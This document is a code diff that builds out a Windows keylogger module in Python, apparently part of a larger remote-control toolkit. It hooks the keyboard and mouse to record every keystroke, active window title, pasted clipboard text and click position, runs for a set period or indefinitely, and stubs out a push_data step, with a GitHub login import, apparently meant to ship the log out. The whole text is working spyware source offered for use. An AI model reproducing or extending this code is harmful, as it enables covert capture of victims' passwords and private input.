@@ -1,27 +1,41 @@
-#module to log key strokes, can log data after expiration or at intevals indefinately
+#module to log key stroke
 #windows only
+#takes interval and period arguments
+#interval - true to continue indefinately, false to quit after period
+#period - if interval is false, run until period; if interval is true, push data after each period
+
 import pythoncom #library for com automation (windows)
+import win32event
 import pyHook #library for windows input hooks
 import win32clipboard
-#from ctypes import * #need to check if this works with dynamic import, may need to just import or use alias
+import StringIO #look into cStringIO
+import time
+from github3 import login
 
 #ctypes was only used to get wondow name which we dont need
 #user32 = windll.user32
 #kernel32 = windll.kernel32
 #psapi = windll.psapi
 current_window = None
+log = StringIO.StringIO()
+
+def check_window(event):
+	global log
+	global current_window
+	if event.WindowName != current_window:
+		current_window = event.WindowName
+		log.write(current_window + "\n")
+	return
 
 #callback on keystroke
 def KeyStroke(event):
-	global current_window
+	global log
 
 	#check if current window has changed
-	if event.WindowName != current_window:
-		current_window = event.WindowName
-		#print current_window
+	check_window(event)
 
 	if event.Ascii > 32 and event.Ascii < 127: #standard key
-		#print chr(event.Ascii)
+		log.write(chr(event.Ascii))
 	else:
 		#get clipboard if ctrl-v
 		if event.Key == "V": #need to test for paste
@@ -29,18 +43,71 @@ def KeyStroke(event):
 			pasted = win32clipboard.GetClipboardData()
 			win32clipboard.CloseClipboard()
 
-			#print pasted
+			log.write("[Paste] " + pasted + " ")
 		else:
-			#print event.Key #was format string
+			log.write(" " + event.Key + " ")
 
 	return True #pass execution to next hook in queue
 
+def MouseLeft(event):
+	global log
+	check_window(event)
+	log.write("Left mouse: " + str(event.Position) + " ")
+	return True
+
+
+def MouseRight(event):
+	global log
+	check_window(event)
+	log.write("Right mouse: " + str(event.Position) + " ")
+	return True
+
+def push_data(config):
+	#todo
+	return
+
 def run(config, **args):
+	global log
+
+	#argument processing
+	try:
+		interval = args["interval"]
+	except:
+		interval = False #quit after period
+	try:
+		period = args["period"]
+	except:
+		period = 3600 #1 hour
+
+	#setup
 	kl = pyHook.HookManager() #create hook manager
 	kl.KeyDown = KeyStroke #register callback on keydown
 	kl.MouseLeftDown = MouseLeft #register callback on mouse
-	kl.MouseRightDown = MouseRight
-	
+	kl.MouseRightDown = MouseRight	
 	kl.HookKeyboard()
-	pythoncom.PumpMessages() #execute forever, put in separate thread so we can return
-	#need to UnhookMouse and keyboard before return
+	kl.HookMouse()
+
+	if interval:
+		while True:
+			start = time.time()
+			while time.time() - start < period:
+				pythoncom.PumpWaitingMessages()
+				win32event.MsgWaitForMultipleObjects([], False, 
+						100, win32event.QS_ALLEVENTS)
+			try:
+				push_data(config)
+			except:
+				pass #just keep going if we cant push
+	else: #msgwait timeout is in milliseconds
+		while time.clock() < period:
+			pythoncom.PumpWaitingMessages()
+			win32event.MsgWaitForMultipleObjects([], False, 100, 
+							win32event.QS_ALLEVENTS)
+
+	#cleanup	
+	data = log.getvalue()
+	log.close()
+	kl.UnhookMouse()
+	kl.UnhookKeyboard()
+
+	return None, data
